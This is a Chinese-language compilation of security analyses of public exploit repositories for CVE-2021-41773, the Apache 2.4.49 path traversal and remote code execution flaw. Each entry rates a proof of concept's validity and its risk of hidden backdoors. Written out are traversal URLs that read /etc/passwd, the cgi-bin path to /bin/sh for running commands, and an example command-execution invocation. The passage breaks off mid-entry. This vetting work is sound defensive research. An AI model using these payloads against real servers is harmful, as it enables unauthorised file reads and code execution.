**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #20

**来源**: [CVE-2021-41773-ashique-thaha_CVE-2021-41773-POC.md](../2021/CVE-2021-41773-ashique-thaha_CVE-2021-41773-POC.md)

## CVE-2021-41773-Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历（Path Traversal）/远程代码执行（RCE）

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，并可能需要启用`mod_cgi`模块且存在`Require all granted`配置。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞。该漏洞源于 `ap_normalize_path` 函数在路径规范化处理上的缺陷，允许攻击者通过构造包含 URL 编码字符（如 `.%2e`）的恶意 URL，绕过路径遍历保护机制，访问服务器文件系统上受限目录之外的文件。

**漏洞利用方式：**

1.  **路径遍历：** 攻击者利用 `.%2e` 绕过路径规范化，构造恶意 URL 以访问任意文件。例如，`http://target/cgi-bin/.%2e/.%2e/.%2e/etc/passwd` 可以用来尝试读取 `/etc/passwd` 文件。

2.  **远程代码执行（RCE）：** 如果服务器启用了 `mod_cgi` 模块，攻击者可以通过上传恶意 CGI 脚本并利用路径遍历漏洞执行该脚本，从而实现远程代码执行。这通常需要结合服务器配置中 `cgi-bin` 目录的 `Require all granted` 指令。

**有效性：**

根据漏洞库信息和搜索结果，该漏洞已在野外被利用，POC 代码的存在进一步验证了其有效性。提供的 README.md 文件详细解释了漏洞原理和利用方法，并提供了搭建漏洞环境的步骤。

**投毒风险：**

虽然提供的 README.md 文件主要包含漏洞说明和环境搭建指导，但是依然存在一定的投毒风险。主要考虑到，如果攻击者修改了环境搭建脚本，例如在安装过程中植入后门，则可能导致受害者搭建一个包含恶意代码的 Apache 服务器。所以需要人工审核确认脚本的安全性，这里认为存在10%的投毒风险。

**总结：**

该漏洞的利用依赖于特定的 Apache 版本和服务器配置。成功利用该漏洞可能导致严重的后果，包括敏感信息泄露和远程代码执行。用户应尽快升级 Apache HTTP Server 版本以修复此漏洞。

**项目地址:** [ashique-thaha/CVE-2021-41773-POC](https://github.com/ashique-thaha/CVE-2021-41773-POC)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #21

**来源**: [CVE-2021-41773-belajarqywok_CVE-2021-41773-MSF.md](../2021/CVE-2021-41773-belajarqywok_CVE-2021-41773-MSF.md)

## CVE-2021-41773 Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致文件泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行存在漏洞的Apache HTTP Server 2.4.49版本，并且Alias-like 指令配置不当，未对外部文件进行访问限制，同时开启了CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 漏洞是 Apache HTTP Server 2.4.49 版本中存在的一个路径遍历漏洞。攻击者可以通过构造包含特殊字符（如`.%%32%65`）的URL，绕过服务器的路径规范化检查，从而访问到Alias-like指令配置目录以外的文件。如果目标服务器未对这些目录的文件进行访问限制（`require all denied`），攻击者就能读取敏感信息。更进一步，如果服务器允许在这些路径下执行CGI脚本，攻击者就可以实现远程代码执行。

**有效性分析：**

漏洞库信息和搜索结果均表明该漏洞已在野外被利用，PoC代码的存在也证实了其可利用性。

**利用方式分析：**

根据漏洞描述和提供的PoC代码，可以总结出以下利用方式：

1.  **路径遍历攻击：** 攻击者构造包含特殊编码的路径，例如：`/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd`尝试读取`/etc/passwd`等敏感文件。
2.  **文件读取：**  如果服务器没有对目标文件进行访问限制，攻击者可以直接读取到文件内容。
3.  **远程代码执行（RCE）：** 如果目标路径允许执行CGI脚本，攻击者可以上传恶意脚本，然后通过路径遍历漏洞执行该脚本，从而实现远程代码执行。

**投毒风险分析：**

提供的PoC代码主要包含以下文件：

*   `1.rb`：一个 Metasploit 模块，尝试通过 GET 请求访问特定 URI（`http://192.168.137.1/cgi-bin/.%%32%65/htdocs/hacklab/websekolah/upload/test.txt`）。该模块的主要目的是读取文件，没有明显的恶意行为。
*   `2.rb`：另一个 Metasploit 模块，尝试通过 GET 请求获取 PDF 文件内容 (tugas.pdf)。该模块的主要目的是读取文件，没有明显的恶意行为。
*   `Makefile`：包含 Maven 命令，用于编译和执行 Java 代码。该命令执行 `com.shell.ReverseShell` 类，并传递一些参数，包括文件名、IP 地址、路径等。**`com.shell.ReverseShell` 存在潜在的投毒风险，因为它可能包含反向 shell 或其他恶意功能。**
*   `apache_rce.rb`：Metasploit 模块，未完全贴出，但是根据文件名推测是进行远程代码执行的模块，存在一定风险。

综合来看，`Makefile` 中调用的 Java 类 `com.shell.ReverseShell` 是最可疑的部分。如果该类包含恶意代码，例如反向 shell，那么执行此 Makefile 就可能导致受害者系统被控制。其他rb文件目前主要进行get请求，风险较低。

**风险评估：**

虽然大部分代码看起来是用于漏洞利用，但是 `Makefile` 中调用的`com.shell.ReverseShell` 存在潜在风险，如果里面包含恶意代码，比如反向 shell，则有被投毒的可能。因此，存在一定的投毒风险，比例估计为10%。

**项目地址:** [belajarqywok/CVE-2021-41773-MSF](https://github.com/belajarqywok/CVE-2021-41773-MSF)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #22

**来源**: [CVE-2021-41773-blackn0te_Apache-HTTP-Server-2.4.49-2.4.50-Path-Traversal-Remote-Code-Execution.md](../2021/CVE-2021-41773-blackn0te_Apache-HTTP-Server-2.4.49-2.4.50-Path-Traversal-Remote-Code-Execution.md)

## CVE-2021-41773/CVE-2021-42013 - Apache HTTP Server Path Traversal and RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49 和 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，且存在可执行的CGI脚本目录

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-41773 和 CVE-2021-42013 是 Apache HTTP Server 2.4.49 和 2.4.50 中的路径遍历漏洞。攻击者可以利用这些漏洞，通过构造特殊的URL来访问服务器上的任意文件，如果服务器启用了CGI脚本执行，则可能导致远程代码执行。

**有效性：**
提供的PoC代码（`exploit.py`）是有效的。它包含利用路径遍历读取任意文件和利用CGI执行远程代码的payload。脚本首先检查目标服务器是否易受攻击（通过检查`Server`头），然后根据用户选择的选项执行相应的攻击。

**投毒风险：**
分析提供的PoC代码，没有发现明显的投毒代码。代码结构清晰，功能明确，主要是构造恶意请求来利用漏洞。脚本中的操作都是为了验证和利用漏洞，没有发现任何隐藏的恶意行为。
投毒风险评估：0%

**利用方式：**
1.  **路径遍历：** 攻击者通过在URL中使用经过特殊编码的路径（例如，`.%2e/%2e%2e`）来绕过服务器的路径检查，从而访问受限目录之外的文件。PoC代码中提供了两个路径遍历Payload `payload1`和`payload2`，利用 `GET` 请求读取文件内容。
2.  **远程代码执行：** 如果服务器配置允许执行CGI脚本，攻击者可以通过路径遍历访问到`bin/sh`，然后通过POST请求将命令作为数据传递给`bin/sh`执行。PoC代码中构造了包含命令的POST请求，利用`req.Session()`和`req.Request()`发送请求并接收响应，实现交互式shell。

**总结：**
该漏洞的利用需要目标服务器存在漏洞版本（2.4.49或2.4.50），并且在路径遍历访问到文件之后，如果服务器配置允许，可以进一步利用CGI执行进行远程代码执行。提供的PoC代码可以成功验证并利用该漏洞，未发现投毒风险。

**项目地址:** [blackn0te/Apache-HTTP-Server-2.4.49-2.4.50-Path-Traversal-Remote-Code-Execution](https://github.com/blackn0te/Apache-HTTP-Server-2.4.49-2.4.50-Path-Traversal-Remote-Code-Execution)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #23

**来源**: [CVE-2021-41773-blu3ming_PoC-CVE-2021-41773.md](../2021/CVE-2021-41773-blu3ming_PoC-CVE-2021-41773.md)

## CVE-2021-41773 Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且受影响的Alias-like指令配置允许访问受限目录外的文件，同时CGI脚本未被禁用。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49版本中存在的一个路径遍历漏洞。该漏洞源于Apache HTTP Server对路径规范化处理的缺陷。攻击者可以通过构造包含URL编码的路径遍历序列的恶意HTTP请求，绕过服务器的安全检查，读取服务器上任意文件，甚至可能执行任意代码。

**有效性分析：**

提供的PoC代码通过构造包含`/.%2e/%2e%2e/%2e%2e/%2e%2e/`的URL，利用Apache HTTP Server 2.4.49的路径遍历漏洞读取指定文件。PoC代码使用`urllib3`库发送HTTP请求，避免了`requests`库自动URL规范化导致的利用失败。
根据漏洞库信息、搜索引擎结果和PoC代码，可以判断该PoC代码有效。

**投毒风险分析：**

对提供的PoC代码进行分析，主要包括以下几个文件：

*   `README.md`: 描述了漏洞的详细信息、利用方法和示例。没有发现恶意代码。
*   `cve-2021-41773.py`: 漏洞利用脚本。该脚本的功能是发送包含恶意路径的HTTP请求，读取指定文件。没有发现明显的恶意代码，但存在潜在风险，即攻击者可能利用该脚本读取服务器上的敏感信息，并进行进一步的攻击。不过从代码本身来看，功能单一，不包含任何额外的后门或者恶意功能。
*   `requirements.txt`: 声明了所需的Python依赖库，包括`requests`和`urllib3`。这两个库都是常用的Python库，没有发现恶意库。

综合分析，该仓库中存在作者隐藏的投毒代码的可能性较低，但不能完全排除攻击者利用该脚本进行恶意活动的风险。

**利用方式：**

1.  **确定目标服务器：** 确定运行Apache HTTP Server 2.4.49的目标服务器。
2.  **检查配置：** 检查目标服务器的`Alias-like`指令配置，确认是否存在允许访问受限目录外的文件的配置。
3.  **构造恶意URL：** 构造包含URL编码的路径遍历序列的恶意URL，例如：`http://target/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd`。
4.  **发送HTTP请求：** 使用PoC脚本或其他工具发送包含恶意URL的HTTP请求。
5.  **读取文件：** 如果漏洞利用成功，服务器将返回指定文件的内容。
6. **远程代码执行：** 如果CGI脚本被允许执行，攻击者可以上传一个恶意的CGI脚本并执行，从而实现远程代码执行。

**项目地址:** [blu3ming/PoC-CVE-2021-41773](https://github.com/blu3ming/PoC-CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #24

**来源**: [CVE-2021-41773-charanvoonna_CVE-2021-41773.md](../2021/CVE-2021-41773-charanvoonna_CVE-2021-41773.md)

## CVE-2021-41773-Apache HTTP Server-路径遍历

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49版本，并且配置允许CGI脚本执行

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 版本中。该漏洞是由于对路径规范化处理的更改存在缺陷导致。攻击者可以利用路径遍历攻击将 URL 映射到 Alias 指令配置目录之外的文件。如果这些目录之外的文件没有受到默认配置 "require all denied" 的保护，则请求可能会成功。如果为这些别名路径启用了 CGI 脚本，则可能允许远程代码执行。

**有效性：**
根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且已被广泛利用。提供的 Dockerfile 和 README.md 文件提供了一个可行的漏洞利用方式。

**利用方式：**
1.  **路径遍历：** 攻击者可以通过构造包含 `..` 或 URL 编码的 `..%2f` 的恶意 URL，绕过服务器的路径检查，访问受限文件。
2.  **CGI 执行：** 如果目标服务器启用了 CGI 脚本执行，攻击者可以通过路径遍历访问 CGI 脚本，并执行任意代码。

**POC 代码分析：**

*   **Dockerfile:** 该 Dockerfile 用于构建一个存在 CVE-2021-41773 漏洞的 Apache HTTP Server 2.4.49 环境。
    *   `FROM httpd:2.4.49`：指定使用 Apache HTTP Server 2.4.49 镜像作为基础镜像。
    *   `RUN sed -i 's/#LoadModule cgi_module/LoadModule cgi_module/' /usr/local/apache2/conf/httpd.conf`：启用 CGI 模块。
    *   `RUN echo ...`：配置 CGI 目录，允许执行 CGI 脚本。
    *   `RUN echo "AllowEncodedSlashes On" >> /usr/local/apache2/conf/httpd.conf`：允许 URL 中包含编码的斜杠，这是利用该漏洞的关键。
    *   `COPY test.cgi /usr/local/apache2/cgi-bin/test.cgi`：复制一个测试 CGI 脚本到 CGI 目录下。
    *   `RUN chmod +x /usr/local/apache2/cgi-bin/test.cgi`：为测试 CGI 脚本添加执行权限。
*   **README.md:** 该文件描述了 CVE-2021-41773 漏洞的细节，以及如何使用 Nmap NSE 脚本检测该漏洞。提供了 Nmap 脚本的架构、payload 设置、HTTP 请求和响应处理、输出格式和错误处理。

**投毒风险：**
提供的 Dockerfile 主要用于搭建漏洞环境以进行验证，风险极低。它本身没有包含恶意代码。
虽然 *test.cgi* 文件内容未知，这里假设 *test.cgi* 为安全的代码，否则投毒的概率会升高。
综合评估投毒风险为 1%。


**项目地址:** [charanvoonna/CVE-2021-41773](https://github.com/charanvoonna/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #25

**来源**: [CVE-2021-41773-dileepdkumar_LayarKacaSiber-CVE-2021-41773.md](../2021/CVE-2021-41773-dileepdkumar_LayarKacaSiber-CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal & Remote Code Execution (RCE)

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许未经身份验证的攻击者读取任意文件或执行任意代码。

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，并且CGI脚本已启用。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49中的一个路径遍历漏洞。该漏洞源于对路径规范化的更改，使得攻击者可以使用路径遍历攻击将URL映射到Alias-like指令配置的目录之外的文件。如果这些目录之外的文件没有受到默认配置"require all denied"的保护，请求可能会成功。如果CGI脚本对这些别名路径启用，则可能导致远程代码执行。

**利用方式：**
攻击者可以构造包含编码后的路径遍历字符（例如`.%2e`）的HTTP请求，绕过服务器的安全检查，访问服务器文件系统上的任意文件。如果服务器配置允许执行CGI脚本，攻击者可以通过上传恶意脚本并执行来实现远程代码执行。

**有效性：**
提供的PoC代码`exploit.sh`看起来是有效的。它使用`curl`命令发送包含路径遍历序列的请求，并尝试执行指定的命令。Dockerfile和httpd-path-traversal.conf文件配置了一个易受攻击的Apache服务器环境，用于测试路径遍历。

**投毒风险：**
检查提供的文件，`/tmp/59e48ccb9412bd5b9a153d1926dd8eca/README.md`，`/tmp/59e48ccb9412bd5b9a153d1926dd8eca/exploit.sh`，`/tmp/59e48ccb9412bd5b9a153d1926dd8eca/Path Traversal/Dockerfile`，`/tmp/59e48ccb9412bd5b9a153d1926dd8eca/Path Traversal/httpd-path-traversal.conf`。这些文件看起来主要用于演示和利用CVE-2021-41773漏洞。其中，`exploit.sh`脚本存在一定的风险，攻击者可以利用此脚本执行恶意命令。`httpd-path-traversal.conf` 配置，如果被攻击者修改，会导致服务器存在后门，但是从目前的代码来看，投毒风险较低。只有 `exploit.sh`存在可被利用的风险，但这不是作者主动投毒，所以投毒风险很低。

**项目地址:** [dileepdkumar/LayarKacaSiber-CVE-2021-41773](https://github.com/dileepdkumar/LayarKacaSiber-CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #26

**来源**: [CVE-2021-41773-gunzf0x_CVE-2021-41773.md](../2021/CVE-2021-41773-gunzf0x_CVE-2021-41773.md)

## CVE-2021-41773-Apache HTTP Server-路径遍历和RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并启用了cgi-bin目录的执行权限

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 中。攻击者可以通过构造包含特殊编码的 URL，利用路径遍历漏洞访问受限目录之外的文件。如果服务器配置允许 CGI 脚本执行，则可以进一步利用该漏洞执行任意代码。 

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的 PoC 代码，此漏洞利用是有效的。漏洞库中提到该漏洞已在野外被利用，多个搜索结果也证实了该漏洞的存在和潜在危害，并提供了利用示例。PoC 代码实现了利用路径遍历漏洞执行命令的功能。

**投毒风险：**
PoC 代码主要功能是利用漏洞实现远程命令执行。以下是对代码可能存在的投毒风险的分析：

*   **代码结构和功能：** PoC 代码结构清晰，主要包括参数解析、URL 构造和 HTTP 请求发送等功能。这些功能都与漏洞利用直接相关。
*   **潜在的风险点：**  PoC 代码中存在一些潜在的风险点：
    *   `data_payload: str = f"echo Content-Type: text/plain; echo; {args.command}"` ，args.command参数如果被恶意构造，可能会导致执行非预期的系统命令。
        *   虽然`clean_url`函数旨在清理URL，但可能存在绕过的风险。

总体来说，代码的投毒风险较低，大概在5%。主要风险集中在命令执行的参数上，以及URL清洗函数可能存在的绕过。

**利用方式：**
1.  **确定目标：** 找到运行 Apache HTTP Server 2.4.49 的目标服务器，并确认 `cgi-bin` 目录已启用。
2.  **构造 Payload：** 使用包含路径遍历的 URL 和要执行的命令构造 HTTP POST 请求。URL 的基本格式如下：
    ```
    /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh
    ```
    其中，`.%2e` 是 `..` 的 URL 编码，用于绕过路径检查。`bin/sh` 是要执行的 shell 程序的路径。
3.  **发送请求：**  将构造好的 HTTP POST 请求发送到目标服务器。
4.  **获取结果：**  如果漏洞利用成功，服务器将执行指定的命令，并将结果作为 HTTP 响应返回。

**项目地址:** [gunzf0x/CVE-2021-41773](https://github.com/gunzf0x/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #27

**来源**: [CVE-2021-41773-hackedrishi_CTF_WRITEUPS-TryHackMe-CVE-2021-41773-.md](../2021/CVE-2021-41773-hackedrishi_CTF_WRITEUPS-TryHackMe-CVE-2021-41773-.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，且存在Alias-like指令配置不当或CGI脚本启用。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49版本中存在的一个路径穿越漏洞。攻击者可以通过构造包含`..`的恶意URL，绕过Alias-like指令配置的目录限制，访问服务器上的任意文件。如果目标服务器启用了CGI脚本，攻击者可能进一步利用该漏洞执行远程代码。根据漏洞描述，需要特定的配置错误，例如，文件没有被"require all denied"保护。从提供的漏洞利用代码看， 该代码本身是一个 CTF 的 Writeup， 解释了漏洞原理和利用方式，本身不包含恶意代码，但可能存在作者隐藏的后门代码的风险，但是可能性极低。

**有效性：**
该漏洞利用代码(CTF Writeup) 本身不直接用于漏洞利用，而是用于解释该漏洞，根据搜索引擎结果，该漏洞真实存在且被广泛利用。

**投毒风险：**
提供的漏洞利用代码是一个CTF Writeup，主要用于讲解漏洞原理，本身不太可能包含恶意投毒代码， 但为了安全起见， 风险评估为5%。

**利用方式：**
1.  **路径穿越：** 构造包含`..`的URL，例如`/%2e%2e/%2e%2e/%2e%2e/etc/passwd`，尝试访问服务器上的敏感文件，如`/etc/passwd`。
2.  **RCE（如果CGI启用）：**如果服务器配置允许执行CGI脚本，攻击者可以通过上传恶意CGI脚本并执行它，来实现远程代码执行。 需要注意的是，通常需要结合Alias指令的配置不当才能实现。

**利用前提：**
*   Apache HTTP Server版本为2.4.49。
*   目标文件所在目录没有被`require all denied`限制。
*   （可选）服务器启用了CGI脚本，并且Alias指令配置不当。

**项目地址:** [hackedrishi/CTF_WRITEUPS-TryHackMe-CVE-2021-41773-](https://github.com/hackedrishi/CTF_WRITEUPS-TryHackMe-CVE-2021-41773-)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #28

**来源**: [CVE-2021-41773-javaamo_CVE-2021-41773.md](../2021/CVE-2021-41773-javaamo_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal & Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行存在漏洞的Apache HTTP Server 2.4.49版本，并启用了cgi-bin目录，且该目录下的文件没有被'require all denied'保护

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2021-41773 漏洞是 Apache HTTP Server 2.4.49 版本中存在的路径遍历漏洞。攻击者可以通过构造包含特殊字符的 URL，绕过 Alias 类似的指令配置的目录限制，访问到服务器上的任意文件。如果服务器同时启用了 CGI 脚本支持，攻击者甚至可以执行任意代码。

**有效性：**
根据漏洞描述和提供的漏洞利用代码，该漏洞利用是有效的。搜索引擎结果也表明该漏洞已被公开利用。

**投毒风险：**
提供的漏洞利用代码主要由一个shell脚本和一个README文件组成。shell脚本的功能是向目标服务器发送包含恶意路径的HTTP请求，读取指定文件或执行命令。README文件是对漏洞利用代码的说明。
脚本本身存在投毒的可能性较低，风险预估1%。主要风险点在于targets.txt文件，如果攻击者替换了targets.txt中的目标，可能会导致非授权的扫描或者攻击。需要注意的是，该PoC本身就是用于攻击的，因此不能将利用漏洞的代码判定为投毒。

**利用方式：**
1.  准备：准备一个包含目标服务器地址列表的 `targets.txt` 文件。
2.  路径遍历：使用`./50383.sh targets.txt /etc/passwd`尝试读取敏感文件，例如`/etc/passwd`。
3.  远程代码执行：如果目标服务器启用了 CGI，则可以通过类似`./50383.sh targets.txt /bin/sh whoami`的方式执行命令。
   需要注意的是，该POC代码尝试利用路径遍历漏洞，将请求发送到`/cgi-bin/`目录，从而触发CGI脚本的执行，最终达到远程代码执行的目的. 如果CGI未开启，则只能进行文件读取。

**项目地址:** [javaamo/CVE-2021-41773](https://github.com/javaamo/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #29

**来源**: [CVE-2021-41773-jkska23_Additive-Vulnerability-Analysis-CVE-2021-41773.md](../2021/CVE-2021-41773-jkska23_Additive-Vulnerability-Analysis-CVE-2021-41773.md)

## CVE-2021-41773-Apache HTTP Server-路径遍历和文件泄露

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，且Alias配置存在缺陷，允许访问受限目录外的文件，并且可能开启了CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

**有效性分析：**

根据漏洞库信息和搜索引擎结果，CVE-2021-41773 是 Apache HTTP Server 2.4.49 版本中存在的路径遍历漏洞，且已被公开利用。搜索引擎结果显示该漏洞允许未经验证的攻击者访问敏感信息，甚至执行任意代码。漏洞库信息也证实了这一点，并指出该漏洞允许攻击者绕过 Alias 指令配置的目录限制，访问未受 "require all denied" 保护的文件。如果目标配置允许，还可能执行 CGI 脚本。

**投毒风险分析：**

提供的“漏洞利用代码”实际上包含两个文件：README.md 和 index.html。

*   **README.md：**  只是一个简单的文本文件，描述了该漏洞和远程代码执行。
*   **index.html：** 是由 pdf2htmlEX 生成的 HTML 文件，用于显示 PDF 内容。这个HTML 文件看起来是正常的，没有任何明显的恶意代码，它的作用仅仅是将PDF转换成了HTML，并没有什么可疑的js或者链接。

因此，提供的代码仓库中**没有**发现任何明显的投毒代码。 投毒风险极低，几乎为0%的可能性

**利用方式：**

利用 CVE-2021-41773 的基本方式是通过构造包含路径遍历字符（如`..%2f`）的 URL 来访问目标服务器上的任意文件。攻击者可以尝试以下步骤：

1.  **确定目标服务器是否运行 Apache HTTP Server 2.4.49。**
2.  **尝试使用路径遍历payload访问敏感文件，例如`/../../../../etc/passwd`。** 使用URL编码来绕过一些常见的安全过滤。
3.  **如果服务器配置允许，尝试执行任意 CGI 脚本。**  这通常涉及到上传恶意脚本并使用路径遍历漏洞来访问和执行它。

**漏洞利用的关键点：**

*   **Alias配置：**  该漏洞依赖于 Apache HTTP Server 的 Alias 指令配置不当。
*   **权限控制：**  被访问的文件必须没有受到 "require all denied" 的保护。
*   **CGI支持：**  如果开启了 CGI 支持，则可能导致远程代码执行。

**项目地址:** [jkska23/Additive-Vulnerability-Analysis-CVE-2021-41773](https://github.com/jkska23/Additive-Vulnerability-Analysis-CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #30

**来源**: [CVE-2021-41773-justakazh_mass_cve-2021-41773.md](../2021/CVE-2021-41773-justakazh_mass_cve-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许未经身份验证的攻击者读取任意文件和/或执行远程代码

**影响版本:** 2.4.49

**利用条件:** 目标系统运行受影响的 Apache HTTP Server 版本，并配置了Alias指令或启用了CGI脚本执行

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

根据漏洞库信息、搜索结果和提供的漏洞利用代码，CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞，如果配置不当，可能导致远程代码执行。该漏洞允许攻击者通过构造包含特殊字符（如 URL 编码的 `%2e` 和 `%2e%2e`）的 URL，来访问服务器上受限目录之外的文件。

**有效性:**

根据漏洞库信息，该漏洞已在野外被利用。提供的 exploit-db 链接 (在 `mass_cve-2021-41773/README.md` 中) 也验证了这一点。提供的python脚本 `cve-2021-41773.py`  通过读取 `/etc/passwd` 文件来检测漏洞存在。另一个脚本 `cve-2021-41773_RCE.py` 尝试通过 cgi-bin 执行命令 `uname`，如果返回 `Linux` 或 `linux`，则认为存在 RCE 漏洞。

**投毒风险:**

检查提供的代码，没有发现明显的恶意或后门代码。所有的脚本都是为了验证漏洞的存在，而不是植入任何持久性的后门。`cve-2021-41773.py`  扫描目标然后保存结果, `cve-2021-41773_RCE.py`  是RCE验证脚本。`cve-2021-41773_manual.py` 允许手动指定命令执行. 因此投毒风险评估为0%。

**利用方式:**

1.  **路径遍历 (文件读取):**  攻击者发送一个精心构造的 HTTP GET 请求，其中包含经过 URL 编码的路径遍历字符，例如 `/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`。如果服务器存在漏洞且目录配置不当，服务器将返回 `/etc/passwd` 的内容。
2.  **远程代码执行 (RCE):**  如果服务器启用了 CGI 脚本执行，攻击者可以使用路径遍历来访问和执行任意脚本。`cve-2021-41773_RCE.py` 脚本通过POST请求向URL发送命令, 例如 `uname`，如果执行成功, 则判定可以RCE.  利用需要服务器配置支持 CGI 脚本，且目标路径没有 require all denied 配置。

**项目地址:** [justakazh/mass_cve-2021-41773](https://github.com/justakazh/mass_cve-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #31

**来源**: [CVE-2021-41773-khaidtraivch_CVE-2021-41773-Apache-2.4.49-.md](../2021/CVE-2021-41773-khaidtraivch_CVE-2021-41773-Apache-2.4.49-.md)

## CVE-2021-41773 Apache HTTP Server Path Traversal & Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可读取敏感文件并远程执行代码

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并且启用了CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

根据漏洞库信息、搜索结果和提供的漏洞利用代码，该漏洞利用具有较高的有效性。

**有效性：**

*   漏洞库明确指出该漏洞已被在野利用。
*   搜索结果显示该漏洞允许未经身份验证的攻击者读取敏感信息并执行任意代码。
*   提供的POC代码包含利用路径遍历读取`/etc/passwd`文件的脚本以及通过CGI执行反向shell的脚本，证明了漏洞的可利用性。

**投毒风险：**

虽然POC代码本身实现了明确的漏洞利用功能，但考虑到其来源的安全性无法完全保证，仍存在潜在的投毒风险。具体分析如下：

*   代码的功能相对简单直接，主要依赖于`curl`命令发送HTTP请求。潜在的投毒方式可能包括：
